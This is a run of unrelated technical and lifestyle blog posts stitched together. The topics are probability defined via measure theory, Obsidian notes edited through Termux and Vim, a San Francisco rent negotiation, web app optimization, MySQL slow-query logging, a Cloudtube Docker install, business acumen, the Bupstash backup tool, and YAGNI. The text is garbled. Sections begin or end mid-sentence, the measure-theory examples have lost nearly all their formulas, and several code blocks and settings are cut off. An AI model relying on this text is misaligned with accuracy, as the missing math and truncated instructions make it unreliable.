<p><span><span>Given the axioms of measure theory, we can define probability succinctly by simply stating that $(\Omega, E, P)$ is a measure space where $P(\Omega) = 1$ (see <a href="https://terrytao.files.wordpress.com/2011/01/measure-book1.pdf" target="_blank" rel="noopener noreferrer">Terence Tao’s Introduction to Measure Theory</a>).</span></span></p>

<h2 id="examples"><a href="#examples">Examples</a></h2>

<p><strong>Finite</strong>: Dice rolls</p>

<p>,<br>
,<br>
.</p>

<p>Note that  is not defined. $P$ measures the “size” of sets.  is the set containing one sample. We can also compute the probability of larger sets, e.g.<br>
,<br>
,<br>
.</p>

<p><strong>Countable</strong> (event set): Variable length binary sequences</p>

<p> is the binary alphabet.<br>
Let $x \in \bin^n$ be a binary sequence of any length $n$, and  returns the length of $x$.</p>

<p>The sample set is all infinite binary sequences, .<br>
This let’s us make an event for each finite length $x$.<br>
Let , where  is the length $\len{x}$ prefix of $\omega$.<br>
The event set is </p>

<p>Then  is the probability of $x$, and  is the probability of the set .<br>
Note that the probability of a finite sequence is always a marginal probability, in the sense that  where  and  are the concatenations of  with 0 or 1.</p>

<p>An example of such a measure is the uniform measure, .</p>

<p><strong>Uncountable</strong>: The reals</p>

<p>,<br>
 contains sets of reals formed by countable union, intersection, and complement of the open intervals. <span><span>This particular choice of $E$ is called the <a href="https://en.wikipedia.org/wiki/Borel_set" target="_blank" rel="noopener noreferrer">Borel algebra</a>, and is a standard $\sigma$-algebra for $\real$. The reason we don’t use $E = 2^\real$ as our event space is that some subsets of $\real$ are not measurable.</span></span></p>

<p>We only need to define $P$ on single intervals, and because of additivity of probability we can derive $P$ on every set in $E$. <span><span>A measure $P$ defined on intervals is called a <a href="https://en.wikipedia.org/wiki/Borel_measure#On_the_real_line" target="_blank" rel="noopener noreferrer">Borel measure</a>.</span></span> Let</p>



<p>Note that it does not matter if we define $P$ on open intervals, closed intervals, or half-open intervals, because the value of the integral is identical between these cases. <span><span>Specifically, we are performing a Lebesgue integral, which is …</span></span></p></article></div>

		<span>November 20 2020</span>
		
		<p>In the latest chapter of <a href="https://www.thegadhian.com/posts/getting-your-shit-together">getting my shit together</a>, I've moved all my notes from <a href="https://www.notion.so/">Notion</a> to <a href="https://obsidian.md/">Obsidian</a>. In this post, I talk a bit about why I think it's cool, and how I use it on my mobile.</p>
<h2>What is Obsidian?</h2>
<p>Obsidian is the latest in the recent vogue of "Second Brain" apps. Essentially it's a place to take notes, and capture ``[[relationships]]` between those notes, resulting in something like your own personal Wikipedia.</p>
<p><img src="https://www.thegadhian.com/posts/using-obsidian-with-termux-and-vim/obsidian.png" alt="My knowledge graph in Obsidian"></p>
<h2>How do I use it?</h2>
<ol>
<li><strong>Daily Notes</strong>: this is where I spend most of my time, capturing anything interesting that happened that day, tasks that come up etc. If something warrants more thought, I'll later turn it into a note of it's own.</li>
<li><strong>Work</strong>: I'll usually keep note files for people (to store notes from 1-1s, anything interesting about them), projects, and occasionally meetings - relating them all together. I'll also create separate notes for any opnions that I'm forming.</li>
<li><strong>Learning</strong>: anything I'm learning about, or reading/watching that I might want to remember later will have a note.</li>
</ol>
<p>I don't really know if it's <a href="https://zettelkasten.de/posts/overview/#the-introduction-to-the-zettelkasten-method">zettelkasten</a>, <a href="https://notes.andymatuschak.org/Evergreen_notes">evergreen notes</a>, or <a href="https://gettingthingsdone.com/what-is-gtd/">GTD</a>, or <a href="https://bulletjournal.com/">bullet journaling</a>. It doesn't really matter.</p>
<h2>Why switch from Notion?</h2>
<p>Notion is great, and definitely does a lot of things better than Obsidian does (particularly in the project management space). I had an awfully elaborate setup with Notion, with all sorts of relational databases. I found that this added a lot of overhead, both for capturing notes and navigating them.</p>
<p>The selling point of Obsidian for me was that all the notes are (more or less) regular markdown, and stored on <a href="https://plaintextproject.online/index.html">plain text files</a> on your own hard drive. There was something rather romantic about the idea of actually owning your own thoughts. Even if the app disappears one day, my notes will still be there in a usable format.</p>
<p>This emphasis on just writing text, and navigating organically through the graph feels like it's led to me writing more.</p>
<h2>What about mobile?</h2>
<p>The caveat was that Obsidian currently only has a desktop app. It's on their <a href="https://trello.com/b/Psqfqp7I/obsidian-roadmap">roadmap</a>, which the two-person team seem to be blistering through.</p>
<p>However the beauty of having plain text files is that I can do <em>whatever I want</em> with them. This is how I've set up my mobile note-taking.</p>
<h3>Syncthing</h3>
<p>To get the files onto my phone (and between my laptops), I use an open source app called <a href="https://syncthing.net/">Syncthing</a>. This works a bit like <code>rsync</code>, and does it's best to keep the files in sync across any connected devices. As most of my notes are small, self-contained files, conflicts tend to be quite rare.</p>
<h3>Termux</h3>
<p>While there are a handful of markdown editing apps available on Android, I prefer to stick with the soothing familiarity of VIM to do my editing. To achieve this, I use an <em>incredible</em> app called <a href="https://termux.com/">Termux</a>.</p>
<p>Termux is a terminal emulator with a large collection of Linux packages - which allows you to use things like git, node.js, ssh, and VIM all from the comfort of your tiny phone.</p>
<pre><code>termux-setup-storage
pkg update
pkg install vim
</code></pre>
<p>With these three commands, I was able to setup Termux to be able to see my synced vault folder, and edit with VIM.</p>
<p><small>(*<em>Okay I also installed git and cloned my dotfiles and installed all my regular VIM plugins. But you get the gist.</em>)</small></p>
<p>One slight annoyance is the the folder will be in different places on each device. To handle that, I have a <code>.extra</code> file to keep environment-specific config, to which which I've added:</p>
<p><code>export KB_DIRECTORY=/storage/shared/kb</code></p>
<h3>VIM</h3>
<p>While it was great to edit the files in VIM, without the graph view and backlink support it was a lot harder to navigate..</p>
<p>Fortunately, with a few additional lines to <code>.vimrc</code>, we can make this easier!</p>
<pre><code>autocmd BufNewFile,BufRead *.md setlocal filetype=markdown
autocmd BufRead,BufNewFile $KB_DIRECTORY* setlocal path+=$KB_DIRECTORY/**
set suffixesadd+=.md
</code></pre>
<p>These three lines do the following:</p>
<ol>
<li>Set the filetype to markdown for md files, which gives us some syntax highlighting</li>
<li>If I'm in any file in the knoweldge base, set my <code>path</code> to include all subdirectories of that folder. This means that when using <code>gf</code> to "go to file under cursor", or using <code>:find</code> to find a file, we can look at all then notes in any of my subdirectories.</li>
<li>Add <code>.md</code> to the list of "default" suffixes. When using <code>gf</code> to navigate to a file, VIM will try all theses suffixes as it looks for the file in the path.</li>
</ol>
<p>The combination of the above means that if I have a [[Backlink]] that points to <code>/SubFolder/Backlink.md</code>, I can put my cursor over the [[Backlink]], hit <code>gf</code> and VIM will be able to navigate to that file. Success!</p>
<h3>Termux API &amp; Widget</h3>
<p>So I now have the ability to edit my notes on my phone, but it's still a bit of a faff. Ideally on a mobile, I'd want to be able to quickly capture a note, and easily find a particular note to refer to.</p>
<p>The first thing I want is the ability to capture a note quickly. As the notes are plain text files, I can easily manipulate them with bash.</p>
<p>I have a bash function that will find or create the daily note file for today's date, and append whatever I type as a bullet to that file.</p>
<pre><code>today() {
	now=$(date +"%Y-%m-%d");
	if ([[ -z $1 ]]); then
		vim "$KB_DIRECTORY/Daily/$now.md"
	else
		echo $"- $@" &gt;&gt; "$KB_DIRECTORY/Daily/$now.md"

	fi
}
</code></pre>
<p>This allows me, wherever I am in the CLI, to type <code>today I did some stuff</code>, and it will add that to my note!</p>
<p>I have a similar (imperfect) function to be able to fuzzy find any note in my knowledge base:</p>
<pre><code>kb() {
	existing=$(find $KB_DIRECTORY -iname \*"$*"\*.md | head -n 1)
	if ([[ -n "$existing" ]]); then
		vim "$existing"
	else
		vim "$KB_DIRECTORY/$*.md"
	fi
}
</code></pre>
<p>This function allows me to type <code>kb obsidian</code> and it will find the first match it finds with obsidian in the name.</p>
<p>That's all well and good, but still involves opening up Termux and typing a bunch a stuff in. Termux has some additional packages that can be installed, which further integrate it with the Android OS.</p>
<p>In particular, I use Termux API, and Termux Widget.</p>
<p><code>pkg install termux-api</code></p>
<p>Termux allows you to create bash scripts in <code>~/.shortcuts/</code> (or <code>~/.shortcuts/tasks</code> for background tasks), which can then be accessed from a homescreen widget. And with Termux API, we can use some of the OS's input facilities. So, I can have a shortcut like the below:</p>
<pre><code>#!/data/data/com.termux/files/usr/bin/bash
source ~/.functions
source ~/.extra

result=$(termux-dialog -t "Note" | jq -r '.text');

today "$result"
</code></pre>
<p>This script opens up a Dialog box which lets me type in a note, uses jq to parse the JSON result of that dialog and extract the text, and uses the <code>today</code> bash function from earlier to capture it in my daily note!</p>
<p>Even better, we can do the same thing with a voice note!</p>
<pre><code>result=$(termux-dialog speech -t "Note" | jq -r '.text');
</code></pre>
<h2>The Result</h2>
<p>Behold, in all it's nerdy goodness:</p>

They looked at placed in North Beach, Nob Hill, SOMA, etc. Eventually, it came down to two places: one in North Beach and one Nob Hill.</p><p>The two units were different. The North Beach one was an old victorian house that came unfurnished and priced at $4900. The Nob Hill one came furnished, was managed by a newer property management company, and was priced at $5500. </p><h2 id="negotiation">Negotiation</h2><p>The San Francisco rent market has been in a free-fall ever since COVID-19 hit.

They intended on negotiating the North Beach unit down to $4600 and the Nob Hill unit down to $5000 (or $5200 w/ parking).</p><p>Negotiations succeed for the Nob Hill unit. They had a good sense of the market since they had seen several other units. They also had other listings to rely on to push the price down.</p><p>Anonymous Hedgehog was able to negotiate down a new lease from the listed price by doing the following:</p><ol><li>Knowing the fair market rent for the area before hand.</li><li>Having a few comparable units to use as an example for negotiation.</li><li>Applying to a few different places in case negotiations fall through.</li></ol><p>The current market conditions give renters negotiation power. Several listings are posted for months before they lower their prices and fill their vacancies.</p></div></div>]]>

A lot of tech discussion these days is focused around scaling web app infrastructures to handle huge traffic.
</p>
<p>
Hacker News abounds with posts about Kubernetes, distributed systems and database replication; the <a href="https://github.com/donnemartin/system-design-primer" target="_blank">Large-Scale System Design Primer</a> on GitHub is extremely well-loved (113k stars) and chock full of advice on memcache clusters and DB sharding.
</p>
<p>
In all the heady excitement of getting your web-based notepad app ready to handle 10 billion daily users, it's important not to forget the power of modern computing hardware and how far simple optimizations can go.
</p>
<p>
You're probably not Facebook. Setting up FAANG-level infrastructure won't make your company into a FAANG, any more than a cargo cult can summon supply-bearing planes by building fake runways and wooden ATC towers.

<p>
There's a place for big, scalable cluster infrastructures, but it's a larger scale than many organizations think.

<h3>The case for optimizing</h3>

<p>
It may sound obvious, but - optimizing your app to fulfill a request in 1/10 the time is like adding 9 servers to a cluster. Optimizing to 1/100 the time (reducing requests from say 1.5 sec to 15ms) is like adding 99 servers. 
</p>
<p>
That's a 1U server doing the work of <em>two 42U server racks</em>, formerly busy turning inefficient code into heat. 
</p>
<p>
That may be an extreme case - but unnecessary bloat is common, and these kinds of gains could be as simple as adding a well-chosen index to speed up a common query by 10x or 100x, or caching some seldom-changing response in memory rather than re-rendering it every time. 
</p>
<p>
Optimizing is good for the world, too:
</p>
<ul>
<li>1/10 or 1/100 the carbon footprint</li>
<li>Cleaner, more maintainable code and systems - optimizing often just means simplifying and removing unnecessary parts</li>
<li>Snappier experience for users (latency is generally lower if you can optimize enough to run on a single server rather than a bunch of networked ones)</li>
<li>Reduced hosting costs</li>
<li>Happier users - developers can focus more on solving users' problems and less on infrastructure</li>

</ul>
<p>
Of course there's a tradeoff between the cost of cloud infrastructure and the cost of paying developers to optimize; but paying developers to set up app clusters and database replication costs money too, and has fewer of the benefits and cost savings.
</p>
<h3>Modern computers are mind-numbingly fast</h3>

<p>
Writing the game engine in C++ for <a href="https://store.steampowered.com/app/1090060/Weapon_Hacker/" target="_blank">Weapon Hacker</a>, a side project of mine, taught me a lot about how powerful modern hardware really is. 
</p>
<p>
Coming from a C# / Python / Javascript / JIT-compiled world, my early experiments putting graphics on the screen in native C++ and DirectX were startling; the compiled executable was tiny, started up instantly, and could put hundreds of thousands of objects on the screen at 60 frames per second without breaking a sweat. 
</p>
<p>
A 60 FPS target gives games about 16ms to do all the work they need to in a frame. Weapon Hacker doesn't even compare to what modern AAA engines do, but it generates its random worlds in about 15ms (which last for about an hour-long playthru), and it handles frames with thousands of particles, physics objects, textures, font glyphs and graphical primitives, as well as sound mixing and music streaming, in about 5ms on a 2010-era CPU.
</p>
<p>
Compared to a game engine, the job of most web apps is incredibly mundane: take a request (some HTTP text) and return a response (some HTML or JSON or some such). And yet, 100ms or 500ms request processing times are common. Sometimes the info returned is expensive to generate, but it pays not to forget that in the end it's just inputting some bytes and outputting some bytes. 
</p>
<p>
Given the relative simplicity of the task, 16ms of processing per request (after subtracting network latency) should be achievable in most web applications.
</p>
<p>
On a cheap $5/month dual-core cloud VM, that would allow about 7,500 requests per minute. Or 7,500 pageviews, if you offload static stuff to a CDN. That means 10.8M per day, or 324M pageviews per month. 
</p>
<p>
Of course traffic wouldn't be evenly spread throughout the day, and cloud computing is generally priced for burst loads. But, let's be honest - your traffic isn't anywhere near 324M pageviews, right?
</p>
<p>
If not, condolences that Notepadly.io isn't a market behemoth yet - but congratulations, you can divert some time from multi-master replication and spot instance auto-scaling, and add a cool Clippy virtual assistant instead. Your users will thank you for it.
</p>
<h3>Optimization basics</h3>

<p>
Server-side optimization is a big topic, and there are likely people much better at it (and at explaining it) than I am, so here are just a few general pointers.
</p>
<p>
First - measure.
</p>
<p>
This can be as simple as putting timers around sections of code to see how many milliseconds they take to execute. Or, look at TTFB (time to first byte) in the Network tab of your browser's dev tools. 
</p>
<p>
2ms and 200ms requests seem similar to human perception, despite a massive 100x time difference, so it pays to have hard data.
</p>
<p>
Run simple stress tests to see how much traffic your app can handle. A simple one-page python script on a nearby VM or a dev machine can easily spin up a bunch of threads to make requests as fast as possible. Count the number of completed requests in, say, 30 seconds and watch your server's CPU, memory and IO usage to see where they max out.
</p>
<p>
Compare your stress test results to your day-to-day traffic, and aim for enough headroom that a normal day's traffic peaks at ~1% capacity (or whatever makes sense for your business).
</p>
<p>
Once you have some baseline measurements, here are a few common performance improvements:
</p>
<ul>
<li>Cache infrequently-changing responses in server memory</li>
<li>Optimize your database queries - add a well-chosen index, or delete an unneeded one (indices are separate internal tables, so you can sometimes save a lot of storage space and I/O time by removing one); tweak your WHERE conditions to narrow down the rows the DB has to scan through internally</li>
<li>Reduce the number of HTTP requests; don't let REST purists tell you you need a separate URL for each entity - if your app always needs customer &amp; order data at the same time, make it a single API call</li>
<li>Let clients cache static files indefinitely; use cache-breakers on the URLs for content changes</li>
<li>Offload static files to a CDN</li>
<li>Make sure your web server and database are set up and tuned right - that they have enough memory, threads, etc.</li>
<li>Consider a fast single-file database like <a href="https://sqlite.org/whentouse.html" target="_blank">SQLite</a>; it's not for every application, but I've found it handles individual queries about 5x faster than the big client-server DBMS's, with about 1/5 the storage space, and with much less administrative complexity. With its performance numbers it can actually power large sites. It also supports sharding scenarios (e.g. a database file per customer) which can get around the write-concurrency limitations for some applications.</li>
<li>Learn about code performance - in particular the dominance of memory latency as a slowdown factor, and the high price of I/O. Chandler Carruth has <a href="https://www.youtube.com/watch?v=fHNmRkzxHWs" target="<em>blank">a great talk</a> on these from a C++ perspective. And Mike Acton's <a href="https://www.youtube.com/watch?v=rX0ItVEVjHc" target="</em>blank">talk on data-oriented design</a> is a classic.</li>

</ul>
<h3>You can upgrade your VM in a pinch</h3>

<p>
Cloud hosts usually let you upgrade to a higher-powered VM pretty easily in the event of some viral flood of traffic; in AWS, on my clients' projects, we have been able to launch more powerful EC2 instances (and vise-versa, consolidate to smaller, cheaper instances) by cloning to an AMI image, launching a new instance, and rerouting the same elastic IP, in about 5 minutes. If you freeze data changes, you can even stay online during the transition.
</p>
<p>
That could buy you time to think about clustering if you reach the scale where you need it.
</p>
<h3>In summary</h3>

<p>
There's a time and a scale for big distributed computing setups. But modern CPUs and cloud VMs are insanely fast, and the job of most web apps is incredibly mundane - you can get very far with some basic optimizations, and will likely do the world, your developers and your users some favors in the process.

<p>MySQL and MariaDB optionally log slow queries into the Slow Query Log – or just Slow Log, as friends call it. However, <strong>there are good reasons to log all the queries</strong>, not just some of them. This article shows how to log all available information into the Slow Log.</p>

<h2><span id="Why_cant_I_only_log_the_slowest_queries">Why can’t I only log the slowest queries?</span></h2>
<p>There are several reasons to log all queries. This list is not exhaustive:</p>
<ul><li>If you have a locking query that takes 0.5 seconds and runs 10 times per second, most probably optimising it is much more relevant than a query that takes 1 second and is executed once per second. Logging the slowest queries may result in <strong>bad priorities</strong>.</li><li>Threshold are not smart. Put a 5 seconds threshold, and you will never know that a very frequent query takes 4.9 seconds. Logging the slowest queries <strong>hides important queries</strong>.</li><li>Suppose you only log queries that take 5 or more seconds. If a query takes less than 1 second more of the times and ore than 5 seconds in rare cases (which typically depends on data distribution) you will lose this information. Logging the slowest queries may <strong>hide the real behaviour</strong> of a query.</li><li>If you don’t log relatively fast queries, you cannot analyse your workload and see, for example, that many locking statements insist on the same table.</li><li>You want to see and remove <a href="https://federico-razzoli.com/run-less-queries-in-mysql"><strong>useless queries</strong></a>.</li><li>For some queries it is perfectly ok to take a long time (one-time queries, cached queries, analytics…). This makes any time threshold <strong>not very significant</strong>.</li></ul>
<h2><span id="How_to_apply_the_changes">How to apply the changes</span></h2>
<p>Below you can find the variables to change, as they should be written in the configuration file (most probably <code>/etc/mysql/my.cnf</code> or <code>/etc/my.cnf</code>). Note that <strong>changes in the configuration file will take effect on MySQL restart</strong>.</p>
<p>You avoid restarting MySQL, but I recommend to make the changes to the configuration file anyway, in case it crashes.</p>
<p><strong>To change variables values at runtime:</strong></p>
<pre><code>SET GLOBAL variable_name := 1;
SET GLOBAL variable_name := 'value'; # string values</code></pre>
<p>This only takes effect for <strong>new connections</strong>. You are not logging all queries until all existing connections are closed and new ones are established.</p>
<h2><span id="Setting_the_Slow_Log">Setting the Slow Log</span></h2>
<p>Here you can find the correct setting to use to log all your queries, depending on which MySQL flavour you use.</p>

<h3><span id="Other_forks">Other forks</span></h3>
<p>WarpSQL 8.0 is based on MySQL 8.0, so you can use the same settings for the slow log.</p>
<h2><span id="Is_the_Slow_Log_slow">Is the Slow Log slow?</span></h2>
<p>In most cases, the slow log performance impact is minimum. It may sound scary to think that MySQL will write something into a file for every single statement; but not if you know the amount of IO that is required for every single statement (undo log, redo log, binlog, doublewrite, potentially reads from tablespaces) and InnoDB background threads. And the slow log is just a sequential write-only file. Slow log access is governed by a lock, but in practice this can only slow down very intensive workloads.</p>
<p>That said, if your IO is nearly saturated, <strong>Percona Server and MariaDB allows to throttle the slow log</strong>. Which means, multiple queries will be written to the file together, to reduce the IO operations. Take a look at <code><a href="https://mariadb.com/kb/en/server-system-variables/#log_slow_rate_limit">log_slow_rate_limit</a></code>. Note however that, if you do so, some queries will not be logged.</p>
<p><strong>NOTE</strong>: Thanks Peter Zaitsev for reporting to me that <code>log_slow_rate_limit</code> was first implemented and is also supported in Percona Server. This allowed me to fix a wrong sentence in the article. He wasn’t able to write a comment on Federico-Razzoli.com, where this article was originally published, because of a problem in that website (now fixed).</p>

    <p>This article will outline the installation of the open-source Youtube front-end <a href="https://sr.ht/~cadence/tube/">Cloudtube</a> by <a href="https://cadence.moe/">Cadence</a> – who also is the author of the open-source Instagram front-end called <a href="https://bibliogram.art/">Bibliogram</a>.</p>

<p>This allows you to watch Youtube with no ads and quite a bit more privacy.</p>

<p>Cloudtube is an alternative to <a href="https://invidious.site/">Invidious</a>, if you’ve heard of it.</p>

<p>Cloudtube consists of two different pieces of software:</p>
<ul>
  <li><a href="https://git.sr.ht/~cadence/Second">Second</a></li>
  <li><a href="https://git.sr.ht/~cadence/cloudtube">Cloudtube</a></li>

<h2 id="second-installation">Second Installation:</h2>

<p>Pull and run the <a href="https://hub.docker.com/r/heywoodlh/second">Second Docker image</a>:</p>

<div><div><pre><code>docker pull heywoodlh/second:latest

	heywoodlh/second
</code></pre></div></div>

<p>Second should now be running on port 3000 of your host.</p>

<h2 id="cloudtube-installaion">Cloudtube Installaion</h2>

<p>Create the directories where the database and config will live for Cloudtube:</p>

<div><div><pre><code><span>mkdir</span> <span>-p</span> /opt/cloudtube/db
<span>mkdir</span> <span>-p</span> /opt/cloudtube/config
</code></pre></div></div>

<p>Now create a config file in <code>/opt/cloudtube/config/config.js</code> with the following content:</p>

<div><div><pre><code>module.exports = {
        user_settings: {
                instance: {
                        default: "http://localhost:3000"
                }
        }
}
</code></pre></div></div>

<p>Make sure the Cloudtube files are owned by the UID/GID of the user in the container image:</p>

<div><div><pre><code>chown -R 1000:1000 /opt/cloudtube/
</code></pre></div></div>

<p>Pull and run the <a href="https://hub.docker.com/r/heywoodlh/cloudtube">Cloudtube Docker image</a>:</p>
<div><div><pre><code>docker pull heywoodlh/cloudtube:latest

<figure><img loading="lazy" width="4000" height="6000" src="https://www.asaremedia.com/wp-content/uploads/2020/11/business-acumen.jpg" alt="business acumen"></figure>



<p>Business leaders exist at every level of a company. They are responsible for making decisions to drive the company forward. Sometimes, you will hear these people described as having <a href="https://brunchwork.com/newsletter?ucode=YASARE1983" rel="nofollow">strong business acumen</a>.&nbsp;</p>



<p>Before you start scratching your head and wondering what this is precisely, we can break it down for you. Business acumen is easy to understand. More crucially, it is something you can build over time when you know how to recognize it. Let’s dive into understanding this ability, why it matters, and how you can develop it.&nbsp;</p>



<h2><strong>Defining It</strong></h2>



<p>Business acumen is the “<a href="http://lexicon.ft.com/Term?term=business-acumen" rel="nofollow">keenness and speed in understanding and deciding on a business situation</a>.” In other words, it is the thought process and intention that goes into deciding on an action and understanding the key factors presented. It also involves the comprehension skills needed to understand all possible routes and outcomes available. With this insight, leaders grasp the potential consequences and necessary trade-offs necessary for optimal results.&nbsp;</p>



<p>A leader with strong business acumen can unpack complex situations. They make the right call and understand how the intricate interrelationships of a business work together. Accomplishing this is no easy task, but it will go far in benefiting the company.&nbsp;</p>



<h2><strong>Operationally Speaking&nbsp;</strong></h2>



<p>Business acumen can tie directly into daily and long-term operations. This speed and keenness are crucial for breaking down seemingly simple questions that have complicated answers. Some of those questions include:&nbsp;</p>



<ul><li>What are the individual roles and contributions present here?</li><li>How does this company/industry generate revenue?</li><li>What elements will be essential in determining if an action will or will not work?</li></ul>



<h2><strong>Developmentally Speaking&nbsp;</strong></h2>



<p>If you feel uncertain about your business acumen, don’t worry! The good news is that it not an innate ability. One does not come into the world with strong business acumen and the ability to quickly make complex decisions.</p>



<p>This skill is something people develop over time, often through formal leadership training. It involves enhancing awareness and recognition of critical skills necessary for strong leadership and management.</p>



<h2><strong>Skillfully Speaking&nbsp;</strong></h2>



<p>So, what are the skills behind a strong business acumen? Well, a person who wishes to develop these comprehension skills fully will:&nbsp;</p>



<ul><li>Focus on key objectives</li><li>Obtain essential information efficiently</li><li>Recognize options and obstacles for potential solutions</li><li>Understand and weight trade-offs through a logical thought process</li><li>Identify routes to overcome obstacles</li><li>Set plans into motion to accomplish objectives</li></ul>



<h2><strong>Do You Have It?&nbsp;</strong></h2>



<p>Overall, this ability will enable you to form broader frameworks for the ultimate benefit of the business. You can focus on the big picture without completely overlooking the finer details. This combination will be to your advantage as you tackle big-picture problems.&nbsp;</p>



<p>You can further develop this by focusing on four elements, which include:&nbsp;</p>



<ul><li>Understanding your thought process<br>Improving overall business knowledge&nbsp;<br>Recognizing your management style while exploring other styles&nbsp;<br>Enhancing leadership and management skills</li></ul>



<p>If you want to continue developing this ability, focus on strengthening analytical skills, enhancing logical thinking, and remaining disciplined. Fine-tuning these qualities will enable you to face complicated problems.&nbsp;</p>

<p>You know backups right? Those things you never got around to setting up… well no need to feel guilty any longer, today
I’m excited to share my new backup tool - <a href="https://bupstash.io/">Bupstash</a>!</p>
<p>So why is bupstash cool? Bupstash lets you make encrypted, deduplicated and secure backups.
Bupstash is fast, focused, and places strong emphasis on both security and privacy. Backups can happen to local drives or over ssh. Bupstash can backup files, directories, and even arbitrary command output.</p>
<p>Bupstash was designed to have:</p>
<ul>
<li>
<p>Efficient deduplication - Bupstash can store hundreds of encrypted directory snapshots using a fraction of the space encrypted tarballs would require.</p>
</li>
<li>
<p>Offline decryption keys - Backups do not require the decryption key be anywhere near an at-risk server or computer.</p>
</li>
<li>
<p>Key/value tagging with search - all while keeping the tags fully encrypted.</p>
</li>
<li>
<p>Great performance on slow networks - Bupstash really strives to work well on high latency networks like cellular and connections to far-off lands.</p>
</li>
<li>
<p>Secure access controls - Ransomware and disgruntled business partners will be powerless to delete your backups, even after a
full system take over.</p>
</li>
<li>
<p>Efficient incremental backups - Bupstash knows what it backed up last time and skips that work.</p>
</li>
</ul>
<p>Sounds great right? How does it work?</p>

<p>Bupstash stores data as a kind of <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a> with encrypted root nodes. Each
time a file is saved, it is split into data chunks, which are
encrypted (using crypto_box_curve25519xchacha20poly1305 from <a href="https://github.com/jedisct1/libsodium">libsodium</a>) and then sent to or saved in the backup repository if they have never been seen before.</p>
<p>To identify encrypted chunks for deduplication, we use an <a href="https://en.wikipedia.org/wiki/HMAC">HMAC</a> of the decrypted contents. The HMAC
key is a shared secret between the encryption key and the decryption key. This means
someone cannot guess a chunk’s contents based on the deduplication address in the backup
repository.</p>
<p>The end result is that many snapshots which share similar data also share encrypted chunks, resulting in very space-efficient backups. My personal backup repository
contains over 400 snapshots of my 40 GB home directory and weighs in at around 50 GB total.</p>

<p>In bupstash a key is either a ‘main key’ or a ‘put key’. Backups made by put keys can only be decrypted by the original
main key. With this setup, you can send backups to a bupstash repository without ever risking your decryption key.</p>
<p>You can imagine Bupstash’s model like when you send someone a <a href="https://en.wikipedia.org/wiki/GNU_Privacy_Guard">GPG</a>-encrypted email and you do not have access to their decryption key. Instead you use asymmetric cryptography and send data addressed
to their private key. Another benefit of the email-like model is that the email provider does not need access to your
decryption keys to store or forward your emails. Likewise, a remote bupstash repository never needs access
to your backup decryption keys to operate.</p>

<p>Bupstash maintains all backups in a mostly append-only log of encrypted backup metadata.
In order to allow searching that metadata, bupstash syncs the metadata log client-side before
performing decryption and searches client-side. This design sacrifices some performance for search and
listing in favour of fully encrypted metadata. In practice bupstash can easily search hundreds to thousands of snapshots
in seconds.</p>

<p>Bupstash focuses on backup and restore streaming, avoiding network round trips as much as possible.</p>
<p>When a user requests an encrypted snapshot, the
server walks the entire data structure server-side, and pushes
it to the client. The client then is able to verify the structure
and restore your data without any network round trips.</p>
<p>The bupstash <a href="https://bupstash.io/doc/man/bupstash-gc.html">‘garbage collector’</a> works
entirely server-side and without requiring the server to decrypt any data, avoiding
sending data to the client in costly and slow ways.</p>
<p>What does this all mean? In some benchmarks restoring backups from a distant
remote server, I was able to achieve 6x performance improvements over the
previous backup tool I was using (benchmarks coming soon).</p>

<p>Bupstash is designed to allow the use of ssh force commands to control whether
an ssh key has permission to make new backups, list backups or remove backups.</p>
<p>In my personal backup setup, my laptop can only add new backups via a vpn, but never remove
old backups from my backup repository. If my laptop were to be stolen, all backups are
safe from deletion.</p>
<p>When bupstash is configured with append-only access controls, making a backup is analagous to sending someone an email,
the recipient of the message is the one who decides when the message can be deleted.</p>
<p>You can see how to set this up in the <a href="https://bupstash.io/doc/guides/Remote%20Access%20Controls.html">access controls tutorial</a>.</p>

<p>Bupstash has the notion of a ‘send log’ for saving bandwidth and accelerating snapshot
speeds. Bupstash remembers which data chunks were
sent in the previous snapshot, allowing the client to avoid resending data pointlessly.</p>

<p>Below is a simple bupstash session:</p>
<pre><code>$ export BUPSTASH_REPOSITORY=ssh://bupstash.io/backups

$ bupstash put host="$(hostname)" name=home-backup.tar /home
ebb66f3baa5d432e9f9a28934888a23d

$ bupstash list host=$(hostname) and 'name=*.tar'
...
id="dbca49b072c0f94b9e72bf81e7716ff9" name="home-backup.tar" hostname="server1" timestamp="2020/08/03 15:47:32"

$ bupstash list-contents id="dbca*"
drwxr-xr-x 0     2020/10/30 13:32:04 .
-rw-r--r-- 1967  2020/10/30 13:32:04 data.txt
...

$ bupstash get id="dbca*" | tar -C ./restore -xvf -
...
$ bupstash get --pick data.txt id="dbca*"
data!

$ bupstash rm name=home-backup.tar and older-than 30d
$ bupstash gc

</code></pre><p>My goal with the bupstash user interface is letting people get on with their day
while having a simple and excellent backup insurance policy.</p>

<p>Bupstash is currently in alpha and ready for people to play with at their own
risk.</p>

				<div>
			<p>The <a href="http://c2.com/">Cunningham &amp; Cunningham Wiki</a> is a wonderful place to get lost in, and it is so (chaotically) packed with useful programming lore that you are bound to come out of a dive a bit more enlightened about what it is programmers actually do.</p>
<p>One of my favorite pages is <a href="http://c2.com/cgi/wiki?YouArentGonnaNeedIt">You Aren’t Gonna Need It</a> from which I pull the following quotation:</p>
<blockquote>
<p>Always implement things when you actually need them, never when you just foresee that you need them.</p>
</blockquote>
<p>The justification for this is pretty straightforward: adding things you don’t need takes time and energy, plus generates more code, which means more potential bugs and cognitive load for future development. Since your job is to deliver software that actually does something which you presumably have at least a provisional understanding of, speculative development is an obvious waste of time.</p>
<p>To this basic justification I add only the following small elaboration: If you don’t need it now, you probably don’t understand it anyway.  Anything you implement speculatively is very likely to be <em>wrong</em> as well as useless.</p>
<h2>Why Software Is Hard</h2>
<p>There are a lot of reasons software engineering is hard.  Probably the primary reason it is hard is that we do not yet have a complete understanding of why it is so hard in the first place.  <a href="http://en.wikipedia.org/wiki/Richard_P._Gabriel">Richard P Gabriel</a>, a software philosopher and progenitor of the <a href="http://en.wikipedia.org/wiki/Worse_is_Better">Worse is Better</a> meme observes, probably correctly, that one reason for this fundamental ignorance is that software engineering is a comparative tyro among engineering disciplines: it is both extremely young (beginning only in 1945, approximately) and subject to radical change.  A developer in 1945 would find the contemporary development environment utterly alien and vice versa, a state of affairs not afflicting, for instance, stone masons, who have, arguably, thousands of years of more or less dependable tradition to inform their work.</p>
<p>With characteristic insight, Dr Gabriel also observes that software engineering is also difficult because it isn’t <em>physically constrained</em><sup>1</sup>, which means that humans, the product of 3.5 billion years of evolution in a physical environment, but not a computational one, have very little experience upon which to rely as they build objects in the space of computable functions.</p>
